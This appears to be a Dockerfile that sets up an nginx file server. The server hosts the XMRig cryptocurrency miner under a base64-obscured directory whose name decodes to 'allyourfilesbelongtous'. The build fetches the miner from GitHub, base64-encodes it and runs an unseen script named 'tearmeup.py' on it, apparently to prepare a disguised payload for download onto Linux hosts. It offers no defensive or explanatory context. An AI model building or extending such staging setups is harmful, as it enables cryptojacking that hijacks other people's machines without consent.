FROM nginx:latest
RUN apt update -y
RUN apt install wget python3 -y
COPY fileserver/fileshare.yourdomain.com.conf /etc/nginx/conf.d/fileshare.yourdomain.com.conf
RUN mkdir -p /opt/fileshare.yourdomain.com/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux
#RUN mkdir -p /usr/share/nginx/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux

#COPY # Remember to copy /usr/share/nginx/html into 

WORKDIR /opt/fileshare.yourdomain.com/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux
#WORKDIR /usr/share/nginx/html/YWxseW91cmZpbGVzYmVsb25ndG91cw/linux
RUN wget -c https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz -O /tmp/xmrig-6.18.1-linux-static-x64.tar.gz
RUN tar -zxvf /tmp/xmrig-6.18.1-linux-static-x64.tar.gz
RUN cp xmrig-6.18.1/xmrig .
RUN rm -rf xmrig-6.18.1/
RUN cat xmrig| base64 > xmrig.b64
COPY fileserver/tearmeup.py .
RUN chmod 755 tearmeup.py
RUN ./tearmeup.py
RUN rm xmrig && rm xmrig.b64 && rm tearmeup.py
